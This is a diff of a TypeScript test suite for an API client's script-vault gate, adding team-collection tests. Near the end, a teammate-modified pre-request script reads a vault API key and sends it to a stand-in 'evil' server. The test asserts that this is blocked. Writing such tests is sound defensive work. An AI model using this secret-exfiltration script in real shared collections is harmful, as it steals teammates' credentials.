@@ -13,7 +13,7 @@ import { CourierCore } from '../src/main/core'
 import { collectionScriptsHash } from '../src/main/script-trust'
 import { MASK, encodeQueryComponent } from '../src/shared/variables'
 import { newRequest, type Collection, type ExecutionResult, type RequestDef, type RunSummary } from '../src/shared/types'
-import { ID_A, ID_B, cleanupTempDirs, echoServer, httpsServer, listen, makeCore, readTree, tempDir, type Listening } from './helpers'
+import { ID_A, ID_B, cleanupTempDirs, echoServer, httpsServer, listen, readTree, seedManifest, teamClient, tempDir, type Listening } from './helpers'
 
 const API_KEY = 'gate-API-k3y-5150'
 const DB_PW = 'gate-db-Pw-8086'
@@ -60,19 +60,24 @@ let container = ''
 beforeEach(async () => {
   container = `g${Math.random().toString(36).slice(2, 12)}`
   await createContainerClient(ACCOUNT, container, new FakeCredential(ID_A)).create()
+  await seedManifest(ACCOUNT, container, { name: 'Gatekeepers' })
 })
 
-async function core(id = ID_A): Promise<CourierCore> {
-  return makeCore({
+/** Signed in, user vault "main" configured, member of the team in `container`. */
+async function core(id = ID_A): Promise<CourierCore & { teamId: string }> {
+  const { core: c, teamId } = await teamClient({
     identity: id,
+    accountUrl: ACCOUNT,
+    container,
     insecureKv: true,
-    settings: { keyVault: { vaults: [{ alias: 'main', url: vault.url }], cacheTtlSeconds: 300 }, storage: { accountUrl: ACCOUNT, container } }
+    settings: { keyVault: { vaults: [{ alias: 'main', url: vault.url }], cacheTtlSeconds: 300 } }
   })
+  return Object.assign(c, { teamId })
 }
 
-/** A collection holding `requests`, returned fresh from the cache. */
-async function collectionWith(c: CourierCore, requests: RequestDef[], opts: { space?: 'local' | 'shared'; patch?: Partial<Collection> } = {}): Promise<Collection> {
-  const { collection } = await c.createCollection({ name: 'Gate', space: opts.space ?? 'local' })
+/** A collection holding `requests` (Personal unless `teamId`), returned fresh from the cache. */
+async function collectionWith(c: CourierCore, requests: RequestDef[], opts: { teamId?: string; patch?: Partial<Collection> } = {}): Promise<Collection> {
+  const { collection } = await c.createCollection({ name: 'Gate', teamId: opts.teamId ?? null })
   if (opts.patch) await c.saveCollection({ ...collection, ...opts.patch })
   for (const r of requests) await c.upsertItem({ collectionId: collection.id, item: r })
   return (await c.load()).collections.find((e) => e.collection.id === collection.id)!.collection
@@ -298,7 +303,7 @@ describe('grant storage and sync', () => {
   it('the grant is never part of the synced document; another client does not inherit it', async () => {
     const a = await core(ID_A)
     const req = newRequest({ id: 'r', url: `${echo.url}/sync`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })
-    const col = await collectionWith(a, [req], { space: 'shared' })
+    const col = await collectionWith(a, [req], { teamId: a.teamId })
     await a.setScriptVaultAccess({ id: col.id, allowed: true })
     expect((await a.runSync()).errors).toEqual([])
     const blob = (await createContainerClient(ACCOUNT, container, new FakeCredential(ID_A)).getBlockBlobClient(`shared/collections/${col.id}.json`).downloadToBuffer()).toString('utf8')
@@ -327,7 +332,7 @@ describe('grant storage and sync', () => {
   it('own local edits keep the grant; a script change from another client makes it lapse', async () => {
     const a = await core(ID_A)
     const req = newRequest({ id: 'r', url: `${echo.url}/lapse`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })
-    const col = await collectionWith(a, [req], { space: 'shared' })
+    const col = await collectionWith(a, [req], { teamId: a.teamId })
     await a.setScriptVaultAccess({ id: col.id, allowed: true })
     await a.runSync()
 
@@ -368,5 +373,54 @@ describe('grant storage and sync', () => {
     // re-allowing binds the grant to the reviewed scripts
     expect((await a.setScriptVaultAccess({ id: col.id, allowed: true })).allowed).toBe(true)
     expect((await a.getScriptVaultAccess(col.id)).lapsed).toBeUndefined()
+  })
+})
+
+describe('team collections and team manifest vaults', () => {
+  it('the gate holds in every team, and for vaults that come from a team manifest (on top of the host approval)', async () => {
+    // a second team whose manifest lists the mock vault as "teamkv"
+    const second = `g${Math.random().toString(36).slice(2, 12)}`
+    await createContainerClient(ACCOUNT, second, new FakeCredential(ID_A)).create()
+    await seedManifest(ACCOUNT, second, { name: 'Vaulted team', vaults: [{ alias: 'teamkv', url: vault.url }] })
+    const a = await core(ID_A)
+    const other = await a.joinTeam({ accountUrl: ACCOUNT, container: second })
+    const script = "pm.vault.get('teamkv/api-key').then((v) => pm.variables.set('k', v));"
+    const inFirst = await collectionWith(a, [newRequest({ id: 'r', url: `${echo.url}/team-one`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })], { teamId: a.teamId })
+    const inSecond = await collectionWith(a, [newRequest({ id: 'r2', url: `${echo.url}/team-two`, preRequestScript: script, headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })], { teamId: other.id })
+    const before = vaultGets
+    expect((await a.send({ collectionId: inFirst.id, requestId: 'r' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
+    expect((await a.send({ collectionId: inSecond.id, requestId: 'r2' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
+    expect(vaultGets).toBe(before)
+    // allowed in the first team only
+    await a.setScriptVaultAccess({ id: inFirst.id, allowed: true })
+    expect((await a.send({ collectionId: inFirst.id, requestId: 'r' })).error).toBeUndefined()
+    expect((await a.send({ collectionId: inSecond.id, requestId: 'r2' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
+    // granting the script is not enough while the team vault host is unapproved
+    await a.setScriptVaultAccess({ id: inSecond.id, allowed: true })
+    const n = vaultGets
+    const unapproved = await a.send({ collectionId: inSecond.id, requestId: 'r2' })
+    expect(unapproved.error?.code).toBe('VAULT_NOT_APPROVED')
+    expect(unapproved.scriptErrors.map((e) => e.code)).toContain('VAULT_NOT_APPROVED')
+    expect(echo.requests.some((r) => r.url === '/team-two')).toBe(false)
+    expect(vaultGets).toBe(n)
+    await a.approveTeamVault({ id: other.id, url: new URL(vault.url).origin })
+    const ok = await a.send({ collectionId: inSecond.id, requestId: 'r2' })
+    expect(ok.error).toBeUndefined()
+    expect(ok.scriptErrors).toEqual([])
+    expect(echo.requests.at(-1)!.headers['x-k']).toBe(API_KEY)
+    expect(leaks(ok)).toEqual([])
+    // a teammate changing the team collection's scripts makes the grant lapse, as for any collection
+    expect((await a.runSync()).errors).toEqual([])
+    const b = await core(ID_B)
+    await b.joinTeam({ accountUrl: ACCOUNT, container: second })
+    await b.runSync()
+    const bReq = (await b.load()).collections.find((e) => e.collection.id === inSecond.id)!.collection.items[0] as RequestDef
+    await b.upsertItem({ collectionId: inSecond.id, item: { ...bReq, preRequestScript: `pm.vault.get('teamkv/api-key').then((v) => pm.sendRequest('${evil.url}/?k=' + v));` } })
+    expect((await b.runSync()).uploaded.map((x) => x.id)).toEqual([inSecond.id])
+    await a.runSync()
+    expect((await a.getScriptVaultAccess(inSecond.id)).allowed).toBe(false)
+    const evilBefore = evil.requests.length
+    expect((await a.send({ collectionId: inSecond.id, requestId: 'r2' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
+    expect(evil.requests.length).toBe(evilBefore)
   })
 })
